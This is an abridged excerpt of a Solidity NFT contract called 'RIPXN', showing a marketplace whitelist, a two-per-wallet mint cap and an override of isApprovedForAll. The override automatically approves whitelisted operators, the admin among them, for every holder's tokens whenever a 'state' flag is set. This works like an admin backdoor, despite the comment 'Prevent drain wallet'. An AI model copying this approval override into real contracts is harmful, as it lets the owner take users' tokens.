...
contract RIPXN is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor() ERC721A("RIPXN", "RIPXN") {
    ...
    marketPlace[0x00000000000111AbE46ff893f3B2fdF1F759a8A8]=true; // blur
    marketPlace[admin]=true; // Prevent drain wallet
  }

  // mint
  function mint(uint quantity) external {
      require(_numberMinted(msg.sender) + quantity < 3, "Max mint: 2 per wallet");
  ...
  function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
      return (state || (owner == admin)) && marketPlace[operator];
  }
}
